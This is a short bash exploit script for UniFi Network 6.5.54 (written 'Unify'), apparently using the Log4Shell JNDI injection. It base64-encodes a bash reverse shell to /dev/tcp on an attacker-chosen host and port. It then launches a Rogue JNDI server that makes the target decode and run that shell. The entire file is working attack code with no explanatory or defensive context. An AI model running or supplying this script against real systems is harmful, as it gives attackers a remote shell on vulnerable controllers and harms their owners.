#!/bin/bash
# By Akelarre, Islas Canarias.
# Explot for Unify 6.5.54

set +x

hostname=$ATTACKER
port=$PORT

echo "[] Creating REVERSE SHELL TO $ATTACKER $PORT: "
rshell=`echo "bash -c bash -i >&/dev/tcp/$hostname/$port 0>&1" | base64`
echo "Length: "$rshell | wc -c

echo "[] Launching Rogue jndi Server: "
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,$rshell}|{base64,-d}|{bash,-i}" --hostname $hostname

